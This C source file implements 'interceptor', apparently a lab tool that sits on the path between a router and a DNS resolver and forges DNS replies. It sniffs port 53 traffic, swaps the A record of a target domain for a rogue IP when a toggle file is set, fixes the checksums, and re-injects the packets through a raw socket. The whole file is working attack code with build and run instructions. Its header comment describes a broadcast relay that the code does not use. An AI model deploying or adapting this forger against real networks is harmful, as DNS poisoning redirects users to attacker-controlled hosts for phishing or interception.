/*
 * Phase 2 interceptor — on-path DNS response forger.
 *
 * core-router routes resolver-bound reply traffic via this attacker's IP
 * as the next hop instead of delivering it directly. Frames arrive here
 * (L2 dst = this host) with their IP destination still the real resolver
 * (no NAT anywhere in this lab).
 *
 * Relay strategy: rather than resolving the resolver's unicast MAC via ARP
 * (fragile — depends on container start order / ARP cache timing), every
 * relayed/forged frame is sent as an Ethernet BROADCAST. Every port on the
 * Linux bridge receives it unconditionally, so delivery never depends on
 * MAC resolution; the unchanged IP destination (172.16.2.10) means only
 * the resolver's kernel actually accepts it at L3 — everyone else on the
 * segment sees a non-matching IP destination and silently drops it.
 *
 * Build: gcc -O2 -Wall -o interceptor interceptor.c -lpcap
 * Run:   ./interceptor <iface> <resolver_ip> <target_fqdn> <rogue_ip> <toggle_file>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>

#define ETH_ALEN 6
#define ETHERTYPE_IP 0x0800

#pragma pack(push, 1)
struct eth_hdr {
    uint8_t  dst[ETH_ALEN];
    uint8_t  src[ETH_ALEN];
    uint16_t ethertype;
};
struct ip_hdr {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint32_t src_ip;
    uint32_t dst_ip;
};
struct udp_hdr {
    uint16_t sport;
    uint16_t dport;
    uint16_t len;
    uint16_t checksum;
};
struct dns_hdr {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};
#pragma pack(pop)

static int raw_sock = -1;          /* IP_HDRINCL raw socket for sending */
static struct sockaddr_in resolver_addr;

static pcap_t *handle = NULL;
static pcap_dumper_t *dumper = NULL;
static uint8_t my_mac[ETH_ALEN];
static char target_fqdn[256];
static uint32_t rogue_ip_net; /* network byte order */
static char toggle_file[512];
static long packets_seen = 0;
static long packets_relayed = 0;
static long packets_forged = 0;

/* ---- helpers ---------------------------------------------------------- */

static uint16_t checksum16(const void *data, size_t len, uint32_t sum) {
    const uint16_t *p = data;
    while (len > 1) {
        sum += *p++;
        len -= 2;
    }
    if (len == 1) sum += *(const uint8_t *)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static int forging_enabled(void) {
    FILE *f = fopen(toggle_file, "r");
    if (!f) return 0;
    int c = fgetc(f);
    fclose(f);
    return c == '1';
}

/* Parse a (possibly compressed) DNS name starting at buf+off, writing the
 * dotted textual form into out (size outsz). Returns offset just past the
 * name as it appears at its original position (one pointer hop handled,
 * sufficient for the uncompressed question + single-pointer answers this
 * lab produces). */
static int parse_name(const uint8_t *buf, int buf_len, int off, char *out, int outsz) {
    int start = off, o = 0, jumped = 0, guard = 0;
    while (off < buf_len && guard++ < 64) {
        uint8_t len = buf[off];
        if (len == 0) { off++; break; }
        if ((len & 0xC0) == 0xC0) {
            if (off + 1 >= buf_len) break;
            int ptr = ((len & 0x3F) << 8) | buf[off + 1];
            if (!jumped) start = off + 2;
            off = ptr;
            jumped = 1;
            continue;
        }
        off++;
        if (off + len > buf_len) break;
        if (o + len + 1 < outsz) {
            memcpy(out + o, buf + off, len);
            o += len;
            out[o++] = '.';
        }
        off += len;
    }
    if (o < outsz) out[o] = '\0'; else out[outsz - 1] = '\0';
    return jumped ? start : off;
}

static void get_own_mac(const char *iface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        exit(1);
    }
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    close(sock);
    fprintf(stderr, "own MAC on %s: %02x:%02x:%02x:%02x:%02x:%02x\n", iface,
            my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
}

/* ---- main packet handler ---------------------------------------------- */

static void handle_packet(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes) {
    (void)user;
    static uint8_t buf[65536];
    if (h->caplen < sizeof(struct eth_hdr) || h->caplen > sizeof(buf)) return;
    memcpy(buf, bytes, h->caplen);
    int caplen = (int)h->caplen;

    struct eth_hdr *eth = (struct eth_hdr *)buf;
    if (ntohs(eth->ethertype) != ETHERTYPE_IP) return;

    int ip_off = sizeof(struct eth_hdr);
    if (caplen < ip_off + (int)sizeof(struct ip_hdr)) return;
    struct ip_hdr *ip = (struct ip_hdr *)(buf + ip_off);
    int ihl = (ip->ver_ihl & 0x0F) * 4;
    if (ip->protocol != 17) return; /* UDP only */

    int udp_off = ip_off + ihl;
    if (caplen < udp_off + (int)sizeof(struct udp_hdr)) return;
    struct udp_hdr *udp = (struct udp_hdr *)(buf + udp_off);

    int dns_off = udp_off + sizeof(struct udp_hdr);
    int dns_len = caplen - dns_off;
    if (dns_len < (int)sizeof(struct dns_hdr)) return;
    struct dns_hdr *dns = (struct dns_hdr *)(buf + dns_off);

    packets_seen++;

    uint16_t flags = ntohs(dns->flags);
    int qr = (flags >> 15) & 1;
    uint16_t qdcount = ntohs(dns->qdcount);
    uint16_t ancount = ntohs(dns->ancount);

    char sbuf[INET_ADDRSTRLEN], dbuf[INET_ADDRSTRLEN];
    struct in_addr sa, da;
    sa.s_addr = ip->src_ip;
    da.s_addr = ip->dst_ip;
    strncpy(sbuf, inet_ntoa(sa), sizeof(sbuf));
    strncpy(dbuf, inet_ntoa(da), sizeof(dbuf));

    int did_forge = 0;
    if (qr == 1 && qdcount >= 1 && ancount >= 1 && forging_enabled()) {
        char qname[256];
        int off = dns_off + sizeof(struct dns_hdr);
        off = parse_name(buf, caplen, off, qname, sizeof(qname));
        off += 4; /* qtype + qclass */

        if (strcasecmp(qname, target_fqdn) == 0) {
            char aname[256];
            int aoff = parse_name(buf, caplen, off, aname, sizeof(aname));
            if (aoff + 10 <= caplen) {
                uint16_t atype;
                memcpy(&atype, buf + aoff, 2);
                atype = ntohs(atype);
                uint16_t rdlength;
                memcpy(&rdlength, buf + aoff + 8, 2);
                rdlength = ntohs(rdlength);
                int rdata_off = aoff + 10;
                if (atype == 1 && rdlength == 4 && rdata_off + 4 <= caplen) {
                    memcpy(buf + rdata_off, &rogue_ip_net, 4);
                    did_forge = 1;
                    packets_forged++;
                }
            }
        }
    }

    /* Recompute the UDP checksum unconditionally for every packet we relay,
     * forged or not. Captured bytes can carry a stale/zero checksum when
     * the sending veth offloaded checksum computation to "hardware" that
     * only patches it at actual transmission time - libpcap sees the
     * pre-offload bytes. We're not retransmitting the original frame, we're
     * injecting a brand-new packet via a raw socket, so we must supply a
     * genuinely valid checksum ourselves rather than trust what we captured. */
    {
        udp->checksum = 0;
        int udp_len = ntohs(udp->len);
        uint32_t pseudo_sum = 0;
        pseudo_sum += (ip->src_ip >> 16) & 0xFFFF;
        pseudo_sum += ip->src_ip & 0xFFFF;
        pseudo_sum += (ip->dst_ip >> 16) & 0xFFFF;
        pseudo_sum += ip->dst_ip & 0xFFFF;
        pseudo_sum += htons(17);
        pseudo_sum += htons((uint16_t)udp_len);
        udp->checksum = checksum16(udp, udp_len, pseudo_sum);
    }

    if (dumper) {
        struct pcap_pkthdr dh = *h;
        dh.caplen = dh.len = caplen;
        pcap_dump((u_char *)dumper, &dh, buf);
    }

    /* Relay via a raw IP_HDRINCL socket: hand the kernel the IP+UDP+DNS
     * bytes exactly as captured (or forged above) and let it handle
     * routing/ARP/L2 delivery itself, rather than us hand-building an
     * Ethernet frame. ip_off skips the 14-byte Ethernet header we
     * captured; everything from there on (the full IP packet) is what
     * the kernel needs. */
    {
        int ip_total_len = ntohs(ip->tot_len);
        if (ip_total_len <= caplen - ip_off) {
            ssize_t sent = sendto(raw_sock, buf + ip_off, ip_total_len, 0,
                                   (struct sockaddr *)&resolver_addr, sizeof(resolver_addr));
            if (sent < 0) {
                perror("sendto");
            } else {
                packets_relayed++;
            }
        }
    }

    fprintf(stderr, "[%s] %s:%u -> %s:%u qr=%d qd=%u an=%u  (seen=%ld relayed=%ld forged=%ld)\n",
            did_forge ? "FORGE" : "relay",
            sbuf, ntohs(udp->sport), dbuf, ntohs(udp->dport),
            qr, qdcount, ancount, packets_seen, packets_relayed, packets_forged);
}

int main(int argc, char **argv) {
    if (argc != 6) {
        fprintf(stderr,
            "usage: %s <iface> <resolver_ip> <target_fqdn> <rogue_ip> <toggle_file>\n",
            argv[0]);
        return 1;
    }
    const char *iface       = argv[1];
    const char *resolver_ip = argv[2]; /* kept for logging/clarity only now */
    strncpy(target_fqdn, argv[3], sizeof(target_fqdn) - 1);
    const char *rogue_ip    = argv[4];
    strncpy(toggle_file, argv[5], sizeof(toggle_file) - 1);

    struct in_addr a;
    if (inet_pton(AF_INET, rogue_ip, &a) != 1) {
        fprintf(stderr, "bad rogue ip\n");
        return 1;
    }
    rogue_ip_net = a.s_addr;

    get_own_mac(iface);

    raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        perror("socket(SOCK_RAW, IPPROTO_RAW)");
        return 1;
    }
    int on = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt IP_HDRINCL");
        return 1;
    }
    memset(&resolver_addr, 0, sizeof(resolver_addr));
    resolver_addr.sin_family = AF_INET;
    if (inet_pton(AF_INET, resolver_ip, &resolver_addr.sin_addr) != 1) {
        fprintf(stderr, "bad resolver ip\n");
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(iface, 65536, 1 /*promisc*/, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }
    if (pcap_setdirection(handle, PCAP_D_IN) < 0) {
        fprintf(stderr, "pcap_setdirection warning: %s\n", pcap_geterr(handle));
        /* non-fatal, keep going */
    }

    dumper = pcap_dump_open(handle, "/tmp/injected.pcap");
    if (!dumper) fprintf(stderr, "pcap_dump_open failed: %s\n", pcap_geterr(handle));

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, "udp and port 53", 1, PCAP_NETMASK_UNKNOWN) < 0 ||
        pcap_setfilter(handle, &fp) < 0) {
        fprintf(stderr, "bpf filter error: %s\n", pcap_geterr(handle));
        return 1;
    }

    fprintf(stderr,
        "interceptor up on %s, resolver=%s (relayed via raw IP_HDRINCL socket), "
        "target=%s rogue=%s, toggle=%s\n",
        iface, resolver_ip, target_fqdn, rogue_ip, toggle_file);

    pcap_loop(handle, -1, handle_packet, NULL);

    if (dumper) pcap_dump_close(dumper);
    pcap_close(handle);
    return 0;
}
